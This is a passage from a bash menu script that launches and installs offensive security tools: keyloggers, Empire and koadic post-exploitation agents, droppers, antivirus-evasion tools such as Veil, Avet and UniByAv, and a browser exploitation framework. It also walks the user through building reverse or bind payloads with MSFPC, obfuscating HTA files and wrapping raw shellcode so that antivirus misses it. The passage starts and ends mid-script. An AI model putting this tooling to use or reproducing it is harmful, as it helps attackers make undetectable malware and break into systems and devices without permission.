post-exploitation agent\"\n\telse\n\t\techo -e \"\"$RS\"11\"$CE\") \"$RS\"Empire\"$CE\"                PowerShell and Python post-exploitation agent\"\n\tfi\n\tif [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]\n\tthen\n\t\techo -e \"\"$YS\"12\"$CE\") Meterpreter Paranoid  Meterpreter Paranoid Mode - SSL/TLS connections\"\n\telse\n\t\techo -e \"\"$RS\"12\"$CE\") \"$RS\"Meterpreter Paranoid\"$CE\"  Meterpreter Paranoid Mode - SSL/TLS connections\"\n\tfi\n\tif [[ -d /root/Dr0p1t-Framework ]]\n\tthen\n\t\techo -e \"\"$YS\"13\"$CE\") Dr0p1t-Framework      Create an advanced stealthy dropper\"\n\telse\n\t\techo -e \"\"$RS\"13\"$CE\") \"$RS\"Dr0p1t-Framework\"$CE\"      Create an advanced stealthy dropper\"\n\tfi\n\tif [[ -d /root/Veil ]]\n\tthen\n\t\techo -e \"\"$YS\"14\"$CE\") Veil-Framework        Generate payloads that bypass common anti-virus\"\n\telse\n\t\techo -e \"\"$RS\"14\"$CE\") \"$RS\"Veil-Framework\"$CE\"        Generate payloads that bypass common anti-virus\"\n\tfi\n\tif [[ -d /root/leviathan ]]\n\tthen\n\t\techo -e \"\"$YS\"15\"$CE\") Leviathan             Wide range mass audit toolkit\"\n\telse\n\t\techo -e \"\"$RS\"15\"$CE\") \"$RS\"Leviathan\"$CE\"             Wide range mass audit toolkit\"\n\tfi\n\tif [[ -d /root/FakeImageExploiter ]]\n\tthen\n\t\techo -e \"\"$YS\"16\"$CE\") FakeImageExploiter    Use a Fake image.jpg to exploit targets\"\n\telse\n\t\techo -e \"\"$RS\"16\"$CE\") \"$RS\"FakeImageExploiter\"$CE\"    Use a Fake image.jpg to exploit targets\"\n\tfi\n\tif [[ -d /root/avet ]]\n\tthen\n\t\techo -e \"\"$YS\"17\"$CE\") Avet                  AntiVirus Evasion Tool\"\n\telse\n\t\techo -e \"\"$RS\"17\"$CE\") \"$RS\"Avet\"$CE\"                  AntiVirus Evasion Tool\"\n\tfi\n\tif [[ -d /root/ARCANUS ]]\n\tthen\n\t\techo -e \"\"$YS\"18\"$CE\") Arcanus               Customized payload generator/handler\"\n\telse\n\t\techo -e \"\"$RS\"18\"$CE\") \"$RS\"Arcanus\"$CE\"               Customized payload generator/handler\"\n\tfi\n\tif [[ -f /usr/bin/msfpc ]]\n\tthen\n\t\techo -e \"\"$YS\"19\"$CE\") MSFPC                 MSFvenom Payload Creator\"\n\telse\n\t\techo -e \"\"$RS\"19\"$CE\") \"$RS\"MSFPC\"$CE\"                 MSFvenom Payload Creator\"\n\tfi\n\tif [[ -d /root/morphHTA ]]\n\tthen\n\t\techo -e \"\"$YS\"20\"$CE\") morphHTA              Morphing Cobalt Strike's evil.HTA\"\n\telse\n\t\techo -e \"\"$RS\"20\"$CE\") \"$RS\"morphHTA\"$CE\"              Morphing Cobalt Strike's evil.HTA\"\n\tfi\n\tif [[ -d /root/LFISuite ]]\n\tthen\n\t\techo -e \"\"$YS\"21\"$CE\") LFISuite              Totally Automatic LFI Exploiter and Scanner\"\n\telse\n\t\techo -e \"\"$RS\"21\"$CE\") \"$RS\"LFISuite\"$CE\"              Totally Automatic LFI Exploiter and Scanner\"\n\tfi\n\tif [[ -d /root/UniByAv ]]\n\tthen\n\t\techo -e \"\"$YS\"22\"$CE\") UniByAv               Generate undetectable executable from raw shellcode\"\n\telse\n\t\techo -e \"\"$RS\"22\"$CE\") \"$RS\"UniByAv\"$CE\"               Generate undetectable executable from raw shellcode\"\n\tfi\n\tif [[ -d /root/demiguise ]]\n\tthen\n\t\techo -e \"\"$YS\"23\"$CE\") Demiguise             HTA encryption tool for RedTeams\"\n\telse\n\t\techo -e \"\"$RS\"23\"$CE\") \"$RS\"Demiguise\"$CE\"              HTA encryption tool for RedTeams\"\n\tfi\n\tif [[ -d /root/DKMC ]]\n\tthen\n\t\techo -e \"\"$YS\"24\"$CE\") DKMC                  Malicious payload evasion tool into image\"\n\telse\n\t\techo -e \"\"$RS\"24\"$CE\") \"$RS\"DKMC\"$CE\"                   Malicious payload evasion tool into image\"\n\tfi\n\tif [[ -d /usr/share/beef-xss ]]\n\tthen\n\t\techo -e \"\"$YS\"25\"$CE\") Beef                  The browser exploitation framework\"\n\telse\n\t\techo -e \"\"$RS\"25\"$CE\") \"$RS\"Beef\"$CE\"                   The browser exploitation framework\"\n\tfi\n\tif [[ -d /root/Evil-Droid ]]\n\tthen\n\t\techo -e \"\"$YS\"26\"$CE\") Evil-Droid            Penetrate android platforms\"\n\telse\n\t\techo -e \"\"$RS\"26\"$CE\") \"$RS\"Evil-Droid\"$CE\"             Penetrate android platforms\"\n\tfi\n\tif [[ -d /root/EggShell ]]\n\tthen\n\t\techo -e \"\"$YS\"27\"$CE\") EggShell              Penetrate android platforms\"\n\telse\n\t\techo -e \"\"$RS\"27\"$CE\") \"$RS\"EggShell\"$CE\"               Penetrate android platforms\"\n\tfi\n\tif [[ -d /root/Zerodoor ]]\n\tthen\n\t\techo -e \"\"$YS\"28\"$CE\") Zerodoor              Penetrate android platforms\"\n\telse\n\t\techo -e \"\"$RS\"28\"$CE\") \"$RS\"Zerodoor\"$CE\"               Penetrate android platforms\"\n\tfi\n\tif [[ -d /root/cromos ]]\n\tthen\n\t\techo -e \"\"$YS\"29\"$CE\") Cromos                Download and Inject code into Google Chrome extensions\"\n\telse\n\t\techo -e \"\"$RS\"29\"$CE\") \"$RS\"Cromos\"$CE\"                 Download and Inject code into Google Chrome extensions\"\n\tfi\n\tif [[ -d /root/AutoSploit ]]\n\tthen\n\t\techo -e \"\"$YS\"30\"$CE\") AutoSploit            Automated Mass Exploiter\"\n\telse\n\t\techo -e \"\"$RS\"30\"$CE\") \"$RS\"AutoSploit\"$CE\"             Automated Mass Exploiter\"\n\tfi\n\tif [[ -d /root/Enigma ]]\n\tthen\n\t\techo -e \"\"$YS\"31\"$CE\") Enigma                Multiplatform payload dropper\"\n\telse\n\t\techo -e \"\"$RS\"31\"$CE\") \"$RS\"Enigma\"$CE\"                 Multiplatform payload dropper\"\n\tfi\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\"00\"$CE\") Main menu\"\n\t#echo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo -e \"Choose: \"\n\tread -e KEYLOG\n\tclear\n\tif [[ \"$KEYLOG\" = \"1\" ]]\n\tthen\n\t\tif [[ -d /root/BeeLogger ]]\n\t\tthen\n\t\t\tcd /root/BeeLogger\n\t\t\tpython bee.py\n\t\t\tcd\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_beelogger\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"10\" ]]\n\tthen\n\t\tif [[ -d /root/koadic ]]\n\t\tthen\n\t\t\tcd /root/koadic\n\t\t\t./koadic\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_koadic\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"11\" ]]\n\tthen\n\t\tif [[ -d /root/Empire ]]\n\t\tthen\n\t\t\tcd /root/Empire\n\t\t\t./empire\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_empire\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"12\" ]]\n\tthen\n\t\tif [[ -d /root/Meterpreter_Paranoid_Mode-SSL ]]\n\t\tthen\n\t\t\tcd /root/Meterpreter_Paranoid_Mode-SSL\n\t\t\t./Meterpreter_Paranoid_Mode.sh\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_meterpreter_paranoid_mode\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"13\" ]]\n\tthen\n\t\tif [[ -d /root/Dr0p1t-Framework ]]\n\t\tthen\n\t\t\tcd /root/Dr0p1t-Framework\n\t\t\tdropit_automation\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_dropit_frmw\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"14\" ]]\n\tthen\n\t\tif [[ -d /root/Veil ]]\n\t\tthen\n\t\t\tcd /root/Veil\n\t\t\t./Veil.py\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_veil\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\n\telif [[ \"$KEYLOG\" = \"15\" ]]\n\tthen\n\t\tif [[ -d /root/leviathan ]]\n\t\tthen\n\t\t\tcd /root/leviathan\n\t\t\tpython leviathan.py\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_leviathan\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"16\" ]]\n\tthen\n\t\tif [[ -d /root/FakeImageExploiter ]]\n\t\tthen\n\t\t\tcd /root/FakeImageExploiter\n\t\t\tnano settings\n\t\t\t./FakeImageExploiter.sh\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_fake_image\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"17\" ]]\n\tthen\n\t\tif [[ -d /root/avet ]]\n\t\tthen\n\t\t\tcd /root/avet/build\n\t\t\tls -1 build*\n\t\t\techo -e \"\"\n\t\t\techo -e \"Type which one you want: \"\n\t\t\tread AVE\n\t\t\tif [[ ! -f /root/avet/build/\"$AVE\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"File not found\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\telse\n\t\t\t\tnano /root/avet/build/\"$AVE\"\n\t\t\t\techo -e \"$PAKTC\"\n\t\t\t\t$READAK\n\t\t\t\tcd /root/avet\n\t\t\t\t./build/\"$AVE\"\n\t\t\t\tgio open /root/avet\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_avet\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"18\" ]]\n\tthen\n\t\tif [[ -d /root/ARCANUS ]]\n\t\tthen\n\t\t\tcd /root/ARCANUS\n\t\t\tgnome-terminal -e \"./ARCANUS & disown\"\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_arcanus\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"19\" ]]\n\tthen\n\t\tif [[ -f /usr/bin/msfpc ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") APK\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") ASP\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") ASPX\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") Bash [.sh]\"\n\t\t\t\techo -e \"\"$YS\" 5\"$CE\") Java [.jsp]\"\n\t\t\t\techo -e \"\"$YS\" 6\"$CE\") Linux [.elf]\"\n\t\t\t\techo -e \"\"$YS\" 7\"$CE\") OSX [.macho]\"\n\t\t\t\techo -e \"\"$YS\" 8\"$CE\") Perl [.pl]\"\n\t\t\t\techo -e \"\"$YS\" 9\"$CE\") PHP\"\n\t\t\t\techo -e \"\"$YS\"10\"$CE\") Powershell [.ps1]\"\n\t\t\t\techo -e \"\"$YS\"11\"$CE\") Python [.py]\"\n\t\t\t\techo -e \"\"$YS\"12\"$CE\") Tomcat [.war]\"\n\t\t\t\techo -e \"\"$YS\"13\"$CE\") Windows [.exe // .dll]\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") Windows [.exe // .dll]\"\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"Choose: \"\t\n\t\t\t\tread TYPE\n\t\t\t\tif [[ \"$TYPE\" -le 13 && \"$TYPE\" -ge 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tif [[ \"$TYPE\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"APK\"\n\t\t\t\t\telif [[ \"$TYPE\" = 2 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"ASP\"\n\t\t\t\t\telif [[ \"$TYPE\" = 3 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"ASPX\"\n\t\t\t\t\telif [[ \"$TYPE\" = 4 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"bash\"\n\t\t\t\t\telif [[ \"$TYPE\" = 5 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"java\"\n\t\t\t\t\telif [[ \"$TYPE\" = 6 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"linux\"\n\t\t\t\t\telif [[ \"$TYPE\" = 7 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"OSX\"\n\t\t\t\t\telif [[ \"$TYPE\" = 8 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"perl\"\n\t\t\t\t\telif [[ \"$TYPE\" = 9 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"PHP\"\n\t\t\t\t\telif [[ \"$TYPE\" = 10 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"powershell\"\n\t\t\t\t\telif [[ \"$TYPE\" = 11 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"python\"\t\t\n\t\t\t\t\telif [[ \"$TYPE\" = 12 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"tomcat\"\n\t\t\t\t\telif [[ \"$TYPE\" = 13 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"windows\"\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tfi\n\t\t\t\telse\n\t\t\t\t\tif [[ \"$TYPE\" = \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tMTYPE=\"windows\"\n\t\t\t\t\telse\n\t\t\t\t\t\techo -e \"\"$RS\"Wrong choise\"$CE\"\"\n\t\t\t\t\t\tsleep 1\n\t\t\t\t\t\tclear\n\t\t\t\t\t\tcontinue\n\t\t\t\t\tfi\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"LHOST: \"\n\t\t\t\tread MLHOST\n\t\t\t\tclear\n\t\t\t\techo -e \"LPORT: \"\n\t\t\t\tread MLPORT\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") CMD                      Smaller size but less features\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") MSF                      Bigger size but more features\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") MSF\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread CMDMSF\n\t\t\t\tif [[ \"$CMDMSF\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tMCMDMSF=\"CMD\"\n\t\t\t\telse\n\t\t\t\t\tMCMDMSF=\"MSF\"\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Bind\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Reverse\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") Reverse\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread BR\n\t\t\t\tif [[ \"$BR\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tMBR=\"BIND\"\n\t\t\t\telse\n\t\t\t\t\tMBR=\"REVERSE\"\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Staged\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Stageless\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") Staged\"\n\t\t\t\techo -e \"Choose: \"\t\n\t\t\t\tread SORS\n\t\t\t\tif [[ \"$SORS\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\tMSORS=\"STAGELESS\"\n\t\t\t\telse\n\t\t\t\t\tMSORS=\"STAGED\"\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") TCP\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") HTTP\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") HTTPS\"\n\t\t\t\techo -e \"\"$YS\" 4\"$CE\") FIND_PORT\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") TCP\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread PRT\n\t\t\t\tif [[ \"$PRT\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\tMPRT=\"HTTP\"\n\t\t\t\telif [[ \"$PRT\" = 3 ]]\n\t\t\t\tthen\n\t\t\t\t\tMPRT=\"HTTPS\"\n\t\t\t\telif [[ \"$PRT\" = 4 ]]\n\t\t\t\tthen\n\t\t\t\t\tMPRT=\"FIND_PORT\"\n\t\t\t\telse\n\t\t\t\t\tMPRT=\"TCP\"\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\tmsfpc $MTYPE $MLHOST $MLPORT $MCMDMSF $MBR $MSORS $MPRT\n\t\t\t\tbreak\n\t\t\tdone\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_msfpc\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"20\" ]]\n\tthen\n\t\tif [[ -d /root/morphHTA ]]\n\t\tthen\n\t\t\twhile true \n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"Your file's path: \"\n\t\t\t\tread FPATH\n\t\t\t\tif [[ ! -f \"$FPATH\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"File does not exist\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") MSHTA\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Explorer\"\n\t\t\t\techo -e \"\"$YS\" 3\"$CE\") WmiPrvSE\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") Explorer\"\n\t\t\t\techo -e \"Choose technique to use:: \"\n\t\t\t\tread MODE\n\t\t\t\tif [[ \"$MODE\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tMMODE=\"mshta\"\n\t\t\t\telif [[ \"$MODE\" = 3 ]]\n\t\t\t\tthen\n\t\t\t\t\tMMODE=\"wmiprvse\"\n\t\t\t\telse\n\t\t\t\t\tMMODE=\"explorer\"\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter max length of randomly generated strings: \"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") 1000\"\n\t\t\t\tread M1\n\t\t\t\tif [[ \"$M1\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tM1=1000\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter max length of randomly generated variable names: \"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") 40\"\n\t\t\t\tread M2\n\t\t\t\tif [[ \"$M2\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tM2=40\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter max number of times values should be split in chr obfuscation: \"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") 10\"\n\t\t\t\tread M3\n\t\t\t\tif [[ \"$M3\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tM3=10\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Enter value of each split: \"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") 10\"\n\t\t\t\tread M4\n\t\t\t\tif [[ \"$M4\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\tM4=10\n\t\t\t\tfi\n\t\t\t\twhile true\n\t\t\t\tdo\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"Enter file to output the morphed HTA to: \"\n\t\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") /root/Desktop/morph.HTA\"\n\t\t\t\t\tread M5\n\t\t\t\t\tif [[ \"$M5\" = \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tM5=\"/root/Desktop/morph.HTA\"\n\t\t\t\t\tfi\n\t\t\t\t\tif [[ -f \"$M5\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$RS\"File already exists\"$CE\"\"\n\t\t\t\t\t\tsleep 3\n\t\t\t\t\t\tcontinue\n\t\t\t\t\telse\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\tdone\n\t\t\t\tbreak\n\t\t\tdone\n\t\t\t\tclear\n\t\t\t\tcd /root/morphHTA\n\t\t\t\tpython morph-hta.py --in \"$FPATH\" --out \"$M5\" --mode \"$M1\" --maxstrlen \"$M2\" --maxvarlen \"$M3\" --maxnumsplit \"$M4\"\n\t\t\t\tcd\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_morphhta\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"21\" ]]\n\tthen\n\t\tif [[ -d /root/LFISuite ]]\n\t\tthen\n\t\t\tcd /root/LFISuite\n\t\t\tpython lfisuite.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_lfi\n\t\t\telse\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tfi\t\n\telif [[ \"$KEYLOG\" = \"22\" ]]\n\tthen\n\t\tif [[ -d /root/UniByAv ]]\n\t\tthen\n\t\t\twhile true\n\t\t\tdo\n\t\t\t\tclear\n\t\t\t\techo -e \"Path to raw shellcode file you want to use: \"\n\t\t\t\tread RPATH\n\t\t\t\tif [[ ! -f \"$RPATH\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"File not found\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Name of output file: \"\n\t\t\t\tread OUT\n\t\t\t\tif [[ -f \"$OUT\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"\"$RS\"File already exists\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\t\tclear\n\t\t\t\techo -e \"Bypass Antivirus or just generate executable?\"\n\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Bypass\"\n\t\t\t\techo -e \"\"$YS\" 2\"$CE\") Just generate\"\n\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") Bypass\"\n\t\t\t\techo -e \"Choose: \"\n\t\t\t\tread BORG\n\t\t\t\tclear\n\t\t\t\tif [[ \"$BORG\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") domain.json\"\n\t\t\t\t\t\techo -e \"\"$YS\" 2\"$CE\") process-and-time-evasion.json\"\n\t\t\t\t\t\techo -e \"\"$YS\" 3\"$CE\") process-evasion.json\"\n\t\t\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") process-evasion.json\"\n\t\t\t\t\t\techo -e \"Choose: \"\n\t\t\t\t\t\tread CONF\n\t\t\t\t\t\tif [[ \"$CONF\" = 1 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tFC=\"domain.json\"\n\t\t\t\t\t\telif [[ \"$CONF\" = 2 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tFC=\"process-and-time-evasion.json\"\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tFC=\"process-evasion.json\"\n\t\t\t\t\t\tfi\n\t\t\t\t\t\tcd /root/UniByAv\n\t\t\t\t\t\tpython UniByAv*.py \"$RPATH\" \"$OUT\" none /root/UniByAv/configs/\"$FC\"\n\t\t\t\t\t\tbreak\n\t\t\t\telse\n\t\t\t\t\t#~ GCC=$(which gcc)\n\t\t\t\t\t#~ if [[ \"$GCC\" = \"\" ]]\n\t\t\t\t\t#~ then\n\t\t\t\t\t\t#~ echo -e \"\"$RS\"gcc not found on your system\"$CE\"\"\n\t\t\t\t\t\t#~ sleep 2\n\t\t\t\t\t\t#~ echo -e \"Proceeding without bypassing Antivirus...\"\n\t\t\t\t\t\t#~ sleep 3\n\t\t\t\t\t\t#~ clear\n\t\t\t\t\t\t#~ echo -e \"\"$YS\" 1\"$CE\") domain.json\"\n\t\t\t\t\t\t#~ echo -e \"\"$YS\" 2\"$CE\") process-and-time-evasion.json\"\n\t\t\t\t\t\t#~ echo -e \"\"$YS\" 3\"$CE\") process-evasion.json\"\n\t\t\t\t\t\t#~ echo -e \"\"$YS\"ENTER\"$CE\") process-evasion.json\"\n\t\t\t\t\t\t#~ echo -e \"Choose: \"\n\t\t\t\t\t\t#~ read CONF\n\t\t\t\t\t\t#~ if [[ \"$CONF\" = 1 ]]\n\t\t\t\t\t\t#~ then\n\t\t\t\t\t\t\t#~ FC=\"domain.json\"\n\t\t\t\t\t\t#~ elif [[ \"$CONF\" = 2 ]]\n\t\t\t\t\t\t#~ then\n\t\t\t\t\t\t\t#~ FC=\"process-and-time-evasion.json\"\n\t\t\t\t\t\t#~ else\n\t\t\t\t\t\t\t#~ FC=\"process-evasion.json\"\n\t\t\t\t\t\t#~ fi\n\t\t\t\t\t\t#~ cd /root/UniByAv\n\t\t\t\t\t\t#~ python UniByAv*.py \"$RPATH\" \"$OUT\" none /root/UniByAv/configs/\"$FC\"\n\t\t\t\t\t\t#~ break\n\t\t\t\t\t#~ else\n\t\t\t\t\t\techo -e \"Path to mingw32-gcc.exe : \"\n\t\t\t\t\t\tread PGCC\n\t\t\t\t\t\t#~ if [[ \"$PGCC\" = \"\" ]]\n\t\t\t\t\t\t#~ then\n\t\t\t\t\t\t\t#~ PGCC=\"$GCC\"\n\t\t\t\t\t\t#~ fi\n\t\t\t\t\t\tclear\n\t\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") domain.json\"\n\t\t\t\t\t\techo -e \"\"$YS\" 2\"$CE\") process-and-time-evasion.json\"\n\t\t\t\t\t\techo -e \"\"$YS\" 3\"$CE\") process-evasion.json\"\n\t\t\t\t\t\techo -e \"\"$YS\"ENTER\"$CE\") process-evasion.json\"\n\t\t\t\t\t\techo -e \"Choose: \"\n\t\t\t\t\t\tread CONF\n\t\t\t\t\t\tif [[ \"$CONF\" = 1 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tFC=\"domain.json\"\n\t\t\t\t\t\telif [[ \"$CONF\" = 2 ]]\n\t\t\t\t\t\tthen\n\t\t\t\t\t\t\tFC=\"process-and-time-evasion.json\"\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tFC=\"process-evasion.json\"\n\t\t\t\t\t\tfi\n\t\t\t\t\t\tcd /root/UniByAv\n\t\t\t\t\t\tpython UniByAv*.py \"$RPATH\" \"$OUT\" \"$PGCC\" /root/UniByAv/configs/\"$FC\"\n\t\t\t\t\t\tbreak\n\t\t\t\t\t#~ fi\n\t\t\t\tfi\t\n\t\t\tdone\n\t\t\tcd /root/UniByAv\n\t\t\tpython UniByAv*.py\n\t\telse\t\n\t\t\techo -e \"$TNI\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" 